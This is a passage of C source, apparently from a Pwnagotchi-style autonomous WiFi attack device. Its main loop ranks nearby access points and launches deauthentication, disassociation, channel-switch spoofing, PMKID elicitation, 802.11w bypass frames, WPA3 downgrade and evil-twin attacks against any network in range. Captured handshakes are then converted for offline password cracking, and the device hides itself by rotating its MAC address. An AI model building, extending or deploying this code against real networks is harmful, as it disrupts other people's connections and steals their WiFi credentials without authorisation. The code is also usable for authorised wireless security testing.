                                              ap.channel, ap.beacon_interval,
                                              ap.encryption);
                    
                    /* Update signal tracker */
                    ts_update_signal(entity, ap.rssi);
                    
                    /* Boost score for APs with clients (better handshake targets) */
                    if (ap.clients_count > 0) {
                        /* More clients = higher chance of capturing handshake on deauth */
                        entity->client_boost = 1.0f + (0.2f * (float)ap.clients_count);
                        if (_has_hs) entity->client_boost *= 0.4f;
                    } else {
                        entity->client_boost = _has_hs ? 0.15f : 0.5f;
                    }
                    
                    /* Store RSSI for sorting */
                    entity->last_rssi = ap.rssi;
                    candidates[candidate_count++] = entity;
                }
            }

            /* Sort candidates by signal strength (strongest first) */
            for (int a = 0; a < candidate_count - 1; a++) {
                for (int b = a + 1; b < candidate_count; b++) {
                    if (candidates[b]->last_rssi > candidates[a]->last_rssi) {
                        ts_entity_t *tmp = candidates[a];
                        candidates[a] = candidates[b];
                        candidates[b] = tmp;
                    }
                }
            }

            /* Cap to top 3 candidates per channel - don't waste CPU on weak APs */
            #define MAX_CANDIDATES_PER_CH 3
            if (candidate_count > MAX_CANDIDATES_PER_CH) {
                if (candidate_count > MAX_CANDIDATES_PER_CH + 1) {
                    fprintf(stderr, "[brain] ch%d: capped %d->%d candidates (weakest dropped: %ddBm)\n",
                            ch, candidate_count, MAX_CANDIDATES_PER_CH,
                            candidates[candidate_count - 1]->last_rssi);
                }
                candidate_count = MAX_CANDIDATES_PER_CH;
            }

            /* Debug: show candidate count */
            if (candidate_count == 0) {
                fprintf(stderr, "[brain] ch%d: no candidates (ap_count=%d)\n", ch, ap_count);
                /* If NO candidates on ANY channel, all APs are conquered.
                 * Skip remaining channels this epoch to save CPU. */
                if (ap_count > 0 && should_really_be_bored(ctx)) {
                    fprintf(stderr, "[brain] ALL APs conquered - skipping attack cycle, idle 30s\n");
                    brain_epoch_next(ctx);
                    brain_update_mood(ctx);
                    /* Run idle cracking while we wait */
                    if (ctx->crack_mgr) {
                        if (ctx->crack_mgr->state == CRACK_RUNNING) {
                            if (crack_mgr_check(ctx->crack_mgr)) {
                                fprintf(stderr, "[crack] *** KEY FOUND (bored)! ***\n");
                                if (ctx->on_attack_phase)
                                    ctx->on_attack_phase(10, ctx->callback_user_data);
                            }
                        } else if (!crack_mgr_exhausted(ctx->crack_mgr)) {
                            crack_mgr_start(ctx->crack_mgr);
                            /* Show crack face when starting idle */
                            if (ctx->on_attack_phase)
                                ctx->on_attack_phase(9, ctx->callback_user_data);
                        }
                    }
                    sleep(30);  /* 30s idle instead of rapid cycling */
                    goto epoch_end;
                }
            } else {
                fprintf(stderr, "[brain] ch%d: %d candidates (mode=%s)\n", ch, candidate_count, 
                        ts_mode_name(ctx->current_mode));
            }

            /* Mode-specific behavior */
            if (ctx->current_mode == MODE_PASSIVE_DISCOVERY) {
                cb_update_stats(&ctx->channel_bandit, ch, channel_counts[ch]);
                /* fall through to attack logic */
            }
            
            if (ctx->current_mode == MODE_COOLDOWN) {
                sleep(3);
                /* fall through */
            }



            /* ===== STAGGERED ATTACK SCHEDULING (AngryOxide-inspired) ===== */
            /* Each epoch runs ONE attack type. Prevents EAPOL timer resets.
             * Epoch % 4:
             *   0 = PMKID elicitation (wifi.assoc) - all APs, even 0 clients
             *   1 = CSA attack (wifi.channel_switch_announce) - APs with clients
             *   2 = Targeted deauth (wifi.deauth per client) - APs with clients  
             *   3 = Passive listen (no attacks, just observe) - lets handshakes complete
             */
            /* Attack phase: Thompson Sampling per-AP (#2) with epoch%8 fallback */
            int attack_phase = ctx->epoch.epoch_num % 8; /* default fallback */
            brain_attack_tracker_t *ap_tracker = NULL; /* set per-target below */
            int did_deauth_this_ch = 0;
            int did_assoc_this_ch = 0;

            uint64_t _t_atk = cpu_act_start();
            for (int ci = 0; ci < candidate_count && ctx->running; ci++) {
                uint64_t _t_ts = cpu_act_start();
                ts_entity_t *target = (ci == 0) ?
                    ts_decide_entity(ctx->thompson, candidates, candidate_count,
                                     &TS_ACTION_ASSOCIATE) :
                    candidates[ci];
                cpu_act_end(g_health_state, CPU_ACT_THOMPSON, _t_ts);
                if (!target) continue;
                if (ci > 0 && candidates[0] == target) continue;

                /* Find the bcap_ap_t for this entity */
                for (int i = 0; i < ap_count; i++) {
                    bcap_ap_t ap;
                    if (bcap_get_ap(ctx->bcap, i, &ap) != 0) continue;

                    char mac_str[BRAIN_MAC_STR_LEN];
                    mac_to_str(&ap.bssid, mac_str);
                    if (strcasecmp(mac_str, target->entity_id) != 0) continue;

                    /* Priority score: stronger signal + more clients = higher */
                    float priority = 1.0f / (1.0f + fabsf((float)ap.rssi + 50.0f) / 30.0f);
                    if (ap.clients_count > 0) priority *= (1.0f + 0.3f * ap.clients_count);

                    /* Per-AP cooldown: skip if attacked < 5s ago (AngryOxide timer_interact) */
                    time_t now_cd = time(NULL);
                    if (target->last_attacked > 0 &&
                        (now_cd - target->last_attacked) < 5 &&
                        attack_phase != 0 && attack_phase != 7) {
                        ts_observe_outcome(target, false, priority * 0.01f);
                        fprintf(stderr, "[brain] [cooldown] %s skip (attacked %lds ago)\n",
                                ap.ssid, (long)(now_cd - target->last_attacked));
                        break;
                    }

                    /* Record for deferred outcome */
                    strncpy(ctx->pending_attack_mac, mac_str, BRAIN_MAC_STR_LEN - 1);
                    ctx->pending_attack_time = time(NULL);
                    ctx->pending_robustness = priority;
                    target->last_attacked = now_cd; /* Update cooldown timer */

                    /* Per-AP attack phase via Thompson Sampling (#2) */
                    ap_tracker = get_attack_tracker(ctx, mac_str);
                    if (ap_tracker) {
                        bool is_wpa3 = (strstr(ap.encryption, "WPA3") || strstr(ap.encryption, "SAE"));
                        ap_tracker->is_wpa3 = is_wpa3;
                        attack_phase = select_attack_phase(ap_tracker, is_wpa3, ctx->config.attack_phase_enabled);
                        ap_tracker->last_attack_phase = attack_phase;
                        /* Sprint 8: Record attack in AP database */
                        ap_db_record_attack(mac_str, attack_phase);
                        if (is_wpa3) {
                            fprintf(stderr, "[brain] [enc-route] %s is WPA3/SAE -> phase %d\n",
                                    ap.ssid, attack_phase);
                        }
                    }

                    /* === PHASE-BASED ATTACK === */
                    if (ctx->current_mode == MODE_PASSIVE_DISCOVERY) {
                        /* Passive mode: observe only, give small Thompson reward */
                        ts_observe_outcome(target, false, priority * 0.05f);
                        break;
                    }


                /* Sprint 6 #14: Adapt TX power for this target */
                int _tx = adapt_tx_power(ctx, ap.rssi);
                set_tx_power(ctx, _tx);

                    /* Sprint 7 #18: Skip attack if phase globally disabled */
    if (!ctx->config.attack_phase_enabled[attack_phase]) {
        fprintf(stderr, "[brain] Phase %d disabled, skipping attack on %s\n", attack_phase, mac_str);
        continue;
    }

    switch (attack_phase) {
                    case 0: {
                        /* PMKID phase: associate with every AP */
                        brain_associate(ctx, &ap);
                        did_assoc_this_ch++;
                        ts_observe_outcome(target, false, priority * 0.1f);
                        fprintf(stderr, "[brain] [assoc] %s (%s) rssi=%d\n",
                                ap.ssid, mac_str, ap.rssi);
                        break;
                    }
                    case 1: {
                        /* CSA phase: trick clients into switching channel 14 (always invalid) */
                        /* AngryOxide approach: raw CSA beacon (6 frames, count 5->0) + action frame */
                        if (g_raw_sock >= 0) {
                            /* Raw CSA beacon injection (6 beacons with countdown) */
                            attack_csa_beacon(g_raw_sock, &ap);
                            /* Raw CSA action frame to broadcast */
                            attack_csa_action(g_raw_sock, &ap);
                        }
                        /* Also send bettercap CSA as fallback/complement */
                        if (ap.clients_count > 0) {
                            char csa_cmd[128];
                            snprintf(csa_cmd, sizeof(csa_cmd),
                                     "wifi.channel_switch_announce %s 14", mac_str);
                            bcap_send_command(ctx->bcap, csa_cmd);
                        } else {
                            /* No clients: do assoc instead (PMKID) */
                            brain_associate(ctx, &ap);
                            did_assoc_this_ch++;
                        }
                        ts_observe_outcome(target, false, priority * 0.1f);
                        break;
                    }
                    case 2: {
                        /* Deauth phase: targeted per-client deauth */
                        int sta_count = bcap_get_sta_count(ctx->bcap);
                        int deauthed = 0;
                        for (int s = 0; s < sta_count && deauthed < 5; s++) {
                            bcap_sta_t sta;
                            if (bcap_get_sta(ctx->bcap, s, &sta) != 0) continue;
                            if (memcmp(sta.ap_bssid.addr, ap.bssid.addr, 6) == 0) {
                                /* Prefer raw bidi deauth (correct reason codes) over bettercap API */
                                if (g_raw_sock >= 0) {
                                    attack_deauth_bidi(g_raw_sock, &ap, &sta);
                                } else {
                                    brain_deauth(ctx, &ap, &sta);
                                }
                                deauthed++;
                            }
                        }
                        if (deauthed > 0) {
                            did_deauth_this_ch++;
                            brain_epoch_track(&ctx->epoch, true, false, false, false, false, deauthed);
                            fprintf(stderr, "[brain] [deauth] %s: %d clients\n",
                                    ap.ssid, deauthed);
                        }
                        /* Broadcast deauth: hit ALL clients at once (AngryOxide-style) */
                        if (g_raw_sock >= 0) {
                            attack_deauth_broadcast(g_raw_sock, &ap);
                            ctx->epoch.any_activity = true;
                            brain_epoch_track(&ctx->epoch, true, false, false, false, false, 1);
                        }
                        if (deauthed == 0 && g_raw_sock < 0) {
                            /* No raw sock and no clients: fallback assoc */
                            brain_associate(ctx, &ap);
                            did_assoc_this_ch++;
                        }
                        ts_observe_outcome(target, false, priority * 0.15f);
                        break;
                    }
                    case 3: {
                        /* PMF BYPASS PHASE: full MFP bypass battery
                         * - anon_reassoc: broadcast reassoc that forces AP-side signed deauth
                         * - eapol_m1_malformed: bad EAPOL M1 disrupts client key state (PMF can't protect EAPOL)
                         * - power_save_spoof: PS bit manipulation causes frame buffering disruption */
                        if (g_raw_sock >= 0) {
                            attack_anon_reassoc(g_raw_sock, &ap);
                            did_deauth_this_ch++;
                            brain_epoch_track(&ctx->epoch, true, false, false, false, false, 1);
                            ctx->epoch.any_activity = true;

                            /* RSN Downgrade for WPA3/SAE targets (#3) */
                            if (strstr(ap.encryption, "WPA3") || strstr(ap.encryption, "SAE")) {
                                int ns_rsn = bcap_get_sta_count(ctx->bcap);
                                int rsn_hit = 0;
                                for (int s = 0; s < ns_rsn && rsn_hit < 3; s++) {
                                    bcap_sta_t sta_rsn;
                                    if (bcap_get_sta(ctx->bcap, s, &sta_rsn) != 0) continue;
                                    if (memcmp(sta_rsn.ap_bssid.addr, ap.bssid.addr, 6) != 0) continue;
                                    attack_rsn_downgrade(g_raw_sock, &ap, &sta_rsn);
                                    rsn_hit++;
                                }
                            }

                            /* Additional PMF bypasses for WPA2/WPA3 targets with clients */
                            if (ap.clients_count > 0) {
                                int ns = bcap_get_sta_count(ctx->bcap);
                                int pmf_hit = 0;
                                for (int s = 0; s < ns && pmf_hit < 3; s++) {
                                    bcap_sta_t sta;
                                    if (bcap_get_sta(ctx->bcap, s, &sta) != 0) continue;
                                    if (memcmp(sta.ap_bssid.addr, ap.bssid.addr, 6) != 0) continue;
                                    /* Malformed EAPOL M1 — bypasses 802.11w */
                                    attack_eapol_m1_malformed(g_raw_sock, &ap, &sta);
                                    /* Power-save spoof — disrupts frame delivery */
                                    attack_power_save_spoof(g_raw_sock, &ap, &sta);
                                    pmf_hit++;
                                }
                            }
                        } else {
                            brain_associate(ctx, &ap);
                            did_assoc_this_ch++;
                        }
                        ts_observe_outcome(target, false, priority * 0.15f);
                        break;
                    }
                    case 4: {
                        /* DISASSOC: bidirectional disassociation via raw injection */
                        int dis_count = 0;
                        if (g_raw_sock >= 0 && ap.clients_count > 0) {
                            int ns = bcap_get_sta_count(ctx->bcap);
                            for (int s = 0; s < ns && dis_count < 5; s++) {
                                bcap_sta_t sta;
                                if (bcap_get_sta(ctx->bcap, s, &sta) != 0) continue;
                                if (!sta.associated) continue;
                                if (memcmp(sta.ap_bssid.addr, ap.bssid.addr, 6) != 0) continue;
                                attack_disassoc_bidi(g_raw_sock, &ap, &sta);
                                dis_count++;
                            }
                        }
                        if (dis_count > 0) {
                            did_deauth_this_ch++;
                            brain_epoch_track(&ctx->epoch, true, false, false, false, false, 1);
                            fprintf(stderr, "[brain] [disassoc] %s: %d clients bidi\n",
                                    ap.ssid, dis_count);
                        } else {
                            brain_associate(ctx, &ap);
                            did_assoc_this_ch++;
                        }
                        ts_observe_outcome(target, false, priority * 0.15f);
                        break;
                    }
                    case 5: {
                        /* ROGUE M2: Evil Twin attack - impersonate AP, send M1, capture M2 */
                        if (g_raw_sock >= 0 && ap.clients_count > 0) {
                            int ns = bcap_get_sta_count(ctx->bcap);
                            int rogue_count = 0;
                            for (int s = 0; s < ns && rogue_count < 3; s++) {
                                bcap_sta_t sta;
                                if (bcap_get_sta(ctx->bcap, s, &sta) != 0) continue;
                                if (memcmp(sta.ap_bssid.addr, ap.bssid.addr, 6) != 0) continue;
                                attack_rogue_m2(g_raw_sock, &ap, &sta);
                                rogue_count++;
                            }
                            if (rogue_count > 0) {
                                did_deauth_this_ch++;
                                brain_epoch_track(&ctx->epoch, true, false, false, false, false, 1);
                                ctx->epoch.any_activity = true;
                                fprintf(stderr, "[brain] [rogue-m2] %s: %d clients sprayed\n",
                                        ap.ssid, rogue_count);
                            }
                        } else if (g_raw_sock >= 0) {
                            /* No clients: send auth+assoc instead for PMKID */
                            attack_auth_assoc_pmkid(g_raw_sock, &ap);
                            did_assoc_this_ch++;
                        }
                        ts_observe_outcome(target, false, priority * 0.2f);
                        break;
                    }
                    case 6: {
                        /* PROBE: Raw probe requests - discover APs + reveal hidden SSIDs */
                        if (g_raw_sock >= 0) {
                            /* Undirected probe (discover all APs on channel) */
                            attack_probe_undirected(g_raw_sock);
                            /* Directed probe to each known AP (reveals hidden SSIDs) */
                            if (strlen(ap.ssid) > 0) {
                                attack_probe_directed(g_raw_sock, &ap);
                            }
                            ctx->epoch.any_activity = true;
                        }
                        ts_observe_outcome(target, false, priority * 0.05f);
                        break;
                    }
                    case 7: {
                        /* Passive listen: let handshakes complete undisturbed */
                        ts_observe_outcome(target, false, priority * 0.02f);
                        break;
                    }
                    }

                    /* AngryOxide insight: ALWAYS try PMKID (m1_retrieval)
                     * on unapproached APs regardless of attack phase.
                     * This dramatically improves PMKID collection rate. */
                    if (attack_phase != 0 && 
                        get_handshake_quality(mac_str) == HS_QUALITY_NONE &&
                        g_raw_sock >= 0 && did_assoc_this_ch == 0) {
                        attack_auth_assoc_pmkid(g_raw_sock, &ap);
                        did_assoc_this_ch = 1;
                        fprintf(stderr, "[brain] [pmkid-always] %s (bg on phase %d)\n",
                                ap.ssid, attack_phase);
                    }

                    /* Track deauth attempts for blacklisting.
                     * If we deauthed but haven't captured a handshake,
                     * the counter increments. After threshold, AP is skipped. */
                    if (did_deauth_this_ch > 0) {
                        brain_track_deauth(ctx, mac_str);
                    }

                    break;  /* Found the AP, move to next candidate */
                }
            }

            cpu_act_end(g_health_state, CPU_ACT_ATTACK, _t_atk);
            
            /* brcmfmac stabilization: brief cooldown after raw injection
             * to let the firmware process sent frames before channel hop.
             * Prevents firmware crashes from back-to-back inject+hop. */
            if (did_deauth_this_ch > 0 || did_assoc_this_ch > 0) {
                usleep(100000);  /* 100ms firmware breathing room */
            }

            /* Smart dwell: only wait if we actually attacked on this channel */
            if (did_deauth_this_ch > 0 || did_assoc_this_ch > 0) {
                int dwell_ms = ctx->config.hop_recon_time * 1000;
                fprintf(stderr, "[brain] waiting %dms before hop to ch %d\n",
                        dwell_ms, (c + 1 < num_channels) ?
                        channels[c + 1] : channels[0]);
                usleep(dwell_ms * 1000);
            }
        }
        
        /* If no activity this epoch, wait before next epoch */
        if (!ctx->epoch.any_activity) {
            int wait_secs = ctx->config.recon_time;
            /* Sprint 4 #9: When mobile, shorter waits (we'll see new APs soon) */
            if (ctx->mobility_score > 0.3f) {
                wait_secs = (int)(wait_secs * (1.0f - ctx->mobility_score * 0.6f));
                if (wait_secs < 3) wait_secs = 3;
                fprintf(stderr, "[brain] no activity, waiting %ds (mobile=%.2f)\n",
                        wait_secs, ctx->mobility_score);
            } else {
                fprintf(stderr, "[brain] no activity, waiting %ds\n", wait_secs);
            }
            sleep(wait_secs);
        }

        /* End of epoch */
        
        /* Check handshake outcome */
        {
            long hs_now = total_handshake_bytes();
            if (ctx->pending_attack_mac[0]) {
                if (hs_now > ctx->hs_bytes_before_epoch) {
                    /* SUCCESS! Handshake captured */
                    ts_entity_t *w = ts_get_or_create_entity(ctx->thompson, ctx->pending_attack_mac);
                    if (w) { 
                        ts_observe_outcome(w, true, ctx->pending_robustness);
                        
                        /* Also reward the channel bandit */
                        cb_observe(&ctx->channel_bandit, w->channel, true);
                        
                        /* And reward the mode bandit */
                        ts_observe_mode_outcome(ctx->thompson, ctx->current_mode, true);
                        ctx->mode_handshakes++;
                    }
                    fprintf(stderr, "[brain] HANDSHAKE! %s rewarded (ch%d, mode=%s)\n", 
                            ctx->pending_attack_mac, 
                            w ? w->channel : 0,
                            ts_mode_name(ctx->current_mode));
                    
                    /* Clear from blacklist tracker — this AP yielded a handshake */
                    brain_track_handshake(ctx, ctx->pending_attack_mac);

                    /* Sprint 3 #6: Immediate hc22000 conversion of new capture */
                    {
                        const char *hs_dirs[] = {"/home/pi/handshakes", "/var/lib/pwnagotchi/handshakes"};
                        for (int hd = 0; hd < 2; hd++) {
                            if (access(hs_dirs[hd], R_OK) == 0) {
                                hc22000_convert_directory(hs_dirs[hd]);
                                break;
                            }
                        }
                    }

                    /* Sprint 8: Update AP DB with handshake info */
                    {
                        char _hs_hash[256] = {0};
                        char _bssid_nocolon[13] = {0};
                        int _j = 0;
                        for (int _k = 0; ctx->pending_attack_mac[_k] && _j < 12; _k++) {
                            if (ctx->pending_attack_mac[_k] != ':') _bssid_nocolon[_j++] = ctx->pending_attack_mac[_k];
                        }
                        DIR *_hdir = opendir("/home/pi/handshakes");
                        if (_hdir) {
                            struct dirent *_hent;
                            while ((_hent = readdir(_hdir)) != NULL) {
                                if (strstr(_hent->d_name, _bssid_nocolon) && strstr(_hent->d_name, ".22000")) {
                                    snprintf(_hs_hash, sizeof(_hs_hash), "/home/pi/handshakes/%s", _hent->d_name);
                                    break;
                                }
                            }
                            closedir(_hdir);
                        }
                        ap_db_set_handshake(ctx->pending_attack_mac, true, 80, _hs_hash);
                    }

                    /* Reward the attack-type bandit (#2) */
                    {
                        brain_attack_tracker_t *hs_tracker = get_attack_tracker(ctx, ctx->pending_attack_mac);
                        if (hs_tracker && hs_tracker->last_attack_phase >= 0) {
                            observe_attack_outcome(hs_tracker, hs_tracker->last_attack_phase, true);
                            fprintf(stderr, "[brain] [atk-bandit] %s: phase %d REWARDED (handshake!)\n",
                                    ctx->pending_attack_mac, hs_tracker->last_attack_phase);
                        }
                    }

                    /* Fire handshake callback for UI notification */
                    if (ctx->on_handshake) {
                        bcap_handshake_t hs_evt = {0};
                        unsigned int m[6];
                        if (sscanf(ctx->pending_attack_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
                                   &m[0],&m[1],&m[2],&m[3],&m[4],&m[5]) == 6) {
                            for (int i = 0; i < 6; i++)
                                hs_evt.ap_bssid.addr[i] = (uint8_t)m[i];
                        }
                        hs_evt.captured_at = time(NULL);
                        ctx->on_handshake(&hs_evt, ctx->callback_user_data);
                    }
                } else {
                    /* No handshake this epoch - penalize attack bandit (#2) */
                    {
                        brain_attack_tracker_t *miss_tracker = get_attack_tracker(ctx, ctx->pending_attack_mac);
                        if (miss_tracker && miss_tracker->last_attack_phase >= 0) {
                            observe_attack_outcome(miss_tracker, miss_tracker->last_attack_phase, false);
                        }
                    }
                    /* No handshake this epoch - small negative for channel */
                    if (ctx->current_channel > 0) {
                        cb_observe(&ctx->channel_bandit, ctx->current_channel, false);
                    }
                }
                ctx->pending_attack_mac[0] = 0;
            }
            ctx->hs_bytes_before_epoch = hs_now;
        }

        { uint64_t _t0 = cpu_act_start();
        brain_epoch_next(ctx);
        brain_update_mood(ctx);
        cpu_act_end(g_health_state, CPU_ACT_EPOCH_END, _t0); }

        /* HULK RECURRING: If still ANGRY, SMASH again every 5 epochs.
         * First HULK fires on mood transition (in brain_set_mood).
         * Subsequent HULKs fire here while anger persists. */
        if (ctx->mood == MOOD_ANGRY && (ctx->epoch.epoch_num % 5) == 0) {
            fprintf(stderr, "[brain] HULK RECURRING (epoch %d, still ANGRY)\n",
                    ctx->epoch.epoch_num);
            brain_hulk_smash(ctx);
        }

        /* Idle cracking: runs at nice -19, won't impact attacks (HTTP only) */
        if (ctx->crack_mgr) {
            /* Always check for finished crack attempts */
            if (ctx->crack_mgr->state == CRACK_RUNNING) {
                uint64_t _t0 = cpu_act_start();
                if (crack_mgr_check(ctx->crack_mgr)) {
                    fprintf(stderr, "[crack] *** KEY FOUND! ***\n");
                    /* Phase 10: KEY FOUND celebration! DOWNLOAD animation + voice */
                    if (ctx->on_attack_phase) {
                        ctx->on_attack_phase(10, ctx->callback_user_data);
                    }
                }
                cpu_act_end(g_health_state, CPU_ACT_CRACK_CHECK, _t0);
            }
            /* Start new crack when idle and nothing running.
             * Triggers on: bored, lonely, sad, or 3+ inactive epochs */
            if (ctx->crack_mgr->state == CRACK_IDLE &&
                (ctx->mood == MOOD_BORED || ctx->mood == MOOD_LONELY ||
                 ctx->mood == MOOD_SAD || ctx->epoch.inactive_for >= 3) &&
                !crack_mgr_exhausted(ctx->crack_mgr)) {
                crack_mgr_start(ctx->crack_mgr);
                /* Phase 9: Show SMART face + "I feel like getting on the CRACK!" */
                if (ctx->on_attack_phase) {
                    ctx->on_attack_phase(9, ctx->callback_user_data);
                }
            }
        }
        
        /* NOTE: wifi.clear REMOVED - it was wiping bettercap's entire AP list
         * every 10 epochs, causing:
         * 1. All APs to re-fire as "new" (false "Something new!" messages)
         * 2. Potential SDIO bus destabilization from rapid stop/restart
         * 3. Loss of tracking data mid-session
         * Bettercap captures EAPOL for all APs regardless of handshake state.
         * The handshake flag only prevents redundant file writes. */

        /* Garbage collect Thompson brain periodically */
        ts_garbage_collect(ctx->thompson);
        
        /* Prune old history periodically */
        brain_prune_history(ctx);
        
        /* Small sleep to prevent busy loop */
        usleep(100000);  /* 100ms */

epoch_end: ;  /* goto target for conquered-idle shortcut */
    }
    
    fprintf(stderr, "[brain] thread stopped\n");
    return NULL;
}

/* ============================================================================
 * Public API
 * ========================================================================== */

brain_ctx_t *brain_create(const brain_config_t *config, bcap_ws_ctx_t *bcap) {
    brain_ctx_t *ctx = calloc(1, sizeof(brain_ctx_t));
    if (!ctx) return NULL;
    
    /* Copy config */
    ctx->config = *config;

    /* Sprint 6: Initialize stealth state */
    ctx->tx_power_current = config->tx_power_max;
    ctx->geo_fence_active = !config->geo_fence_enabled;  /* Start as inside if fence disabled */
    ctx->last_mac_rotation = time(NULL);
    
    /* Copy channels array if provided */
    if (config->channels && config->num_channels > 0) {
        ctx->config.channels = malloc(config->num_channels * sizeof(int));
        if (!ctx->config.channels) {
            free(ctx);
            return NULL;
        }
        memcpy(ctx->config.channels, config->channels,
               config->num_channels * sizeof(int));
    }
    
    /* Set bettercap context */
    ctx->bcap = bcap;
    
    /* Initialize Thompson Sampling brain */
    ctx->thompson = ts_brain_create();
    if (!ctx->thompson) {
        if (ctx->config.channels) free(ctx->config.channels);
        free(ctx);
        return NULL;
    }
    
    /* Try to load saved state */
    ts_load_state(ctx->thompson, "/etc/pwnagotchi/brain_state.bin");
    
    /* Initialize channel bandit (Thompson-based channel selection) */
    cb_init(&ctx->channel_bandit);

    /* Initialize stealth system */
    /* Sprint 6: Create stealth with proper config from brain settings */
    {
        stealth_config_t sconfig = stealth_config_default();
        sconfig.mac_rotation_enabled = config->mac_rotation_enabled;
        sconfig.mac_rotation_interval = config->mac_rotation_interval;
        ctx->stealth = stealth_create(&sconfig, "wlan0mon");
    }
    if (ctx->stealth) {
        fprintf(stderr, "[brain] stealth system initialized\n");
    }
    
    /* Initialize WiFi recovery system */
    ctx->wifi_recovery = wifi_recovery_create(NULL, "wlan0mon", "wlan0");
    if (ctx->wifi_recovery) {
        fprintf(stderr, "[brain] wifi_recovery system initialized\n");
    }

    /* Initialize idle crack manager */
    ctx->crack_mgr = crack_mgr_create();
    if (ctx->crack_mgr) {
        crack_mgr_scan(ctx->crack_mgr);
        fprintf(stderr, "[brain] crack_mgr: %d targets, %d wordlists, %d cracked\n",
                ctx->crack_mgr->num_targets, ctx->crack_mgr->num_wordlists,
                ctx->crack_mgr->total_cracked);
    }
    
    /* Initialize mode state */
    /* Sprint 8: Initialize AP Database */
    if (ap_db_init(NULL) == 0) {
        fprintf(stderr, "[brain] AP database initialized\n");
    }

    /* Sprint 8: Initialize hash sync */
    hash_sync_init(&config->sync_config);

    ctx->current_mode = MODE_ACTIVE_TARGETING;
    ctx->mode_started = time(NULL);
    ctx->mode_handshakes = 0;
    
    /* Initialize epoch */
    ctx->epoch.epoch_num = 0;
    brain_epoch_reset(&ctx->epoch);
    
    /* Initialize mutex */
    pthread_mutex_init(&ctx->lock, NULL);
    
    /* Initial mood */
    ctx->mood = MOOD_STARTING;
    
    return ctx;
}

void brain_set_health_state(health_state_t *hs) {
    g_health_state = hs;
}

int brain_start(brain_ctx_t *ctx) {
    if (!ctx || ctx->started) return -1;
    
    ctx->running = true;
    ctx->started = true;
    
    int ret = pthread_create(&ctx->thread, NULL, brain_thread_func, ctx);
    if (ret != 0) {
        ctx->running = false;
        ctx->started = false;
        return -1;
    }
    
    return 0;
}

void brain_stop(brain_ctx_t *ctx) {
    if (!ctx || !ctx->running) return;
    
    ctx->running = false;
    pthread_join(ctx->thread, NULL);
}

void brain_destroy(brain_ctx_t *ctx) {
    /* Stop and destroy crack manager */
    if (ctx && ctx->crack_mgr) {
        crack_mgr_destroy(ctx->crack_mgr);
        ctx->crack_mgr = NULL;
    }

    /* Close raw injection socket */
    if (g_raw_sock >= 0) { close(g_raw_sock); g_raw_sock = -1; }

    if (!ctx) return;
    
    brain_stop(ctx);
    
    /* Save Thompson brain state before destroying */
    if (ctx->stealth) {
        stealth_destroy(ctx->stealth);
        ctx->stealth = NULL;
    }
    
    if (ctx->wifi_recovery) {
        wifi_recovery_destroy(ctx->wifi_recovery);
        ctx->wifi_recovery = NULL;
    }

    if (ctx->thompson) {
        ts_save_state(ctx->thompson, "/etc/pwnagotchi/brain_state.bin");
        ts_brain_destroy(ctx->thompson);
    }
    
    /* Sprint 8: Close AP database */
    ap_db_close();

    pthread_mutex_destroy(&ctx->lock);
    
    if (ctx->config.channels) {
        free(ctx->config.channels);
    }
    
    if (ctx->history) {
        free(ctx->history);
    }
    
    free(ctx);
}

/* Sprint 8: AP Database stats accessor */
int brain_get_ap_db_stats(ap_db_stats_t *stats) {
    return ap_db_get_stats(stats);
}

brain_mood_t brain_get_mood(brain_ctx_t *ctx) {
    if (!ctx) return MOOD_STARTING;
    return ctx->mood;
}

void brain_get_epoch(brain_ctx_t *ctx, brain_epoch_t *epoch) {
    if (!ctx || !epoch) return;
    
    pthread_mutex_lock(&ctx->lock);
    *epoch = ctx->epoch;
    pthread_mutex_unlock(&ctx->lock);
}

int brain_get_uptime(brain_ctx_t *ctx) {
    if (!ctx || ctx->started_at == 0) return 0;
    return (int)(time(NULL) - ctx->started_at);
}

void brain_set_callbacks(brain_ctx_t *ctx,
    void (*on_mood_change)(brain_mood_t mood, void *user_data),
    void (*on_deauth)(const bcap_ap_t *ap, const bcap_sta_t *sta, void *user_data),
    void (*on_associate)(const bcap_ap_t *ap, void *user_data),
    void (*on_handshake)(const bcap_handshake_t *hs, void *user_data),
    void (*on_epoch)(int epoch_num, const brain_epoch_t *data, void *user_data),
    void (*on_channel_change)(int channel, void *user_data),
    void *user_data)
{
    if (!ctx) return;
    
    ctx->on_mood_change = on_mood_change;
    ctx->on_deauth = on_deauth;
    ctx->on_associate = on_associate;
    ctx->on_handshake = on_handshake;
    ctx->on_epoch = on_epoch;
    ctx->on_channel_change = on_channel_change;
    ctx->callback_user_data = user_data;
}

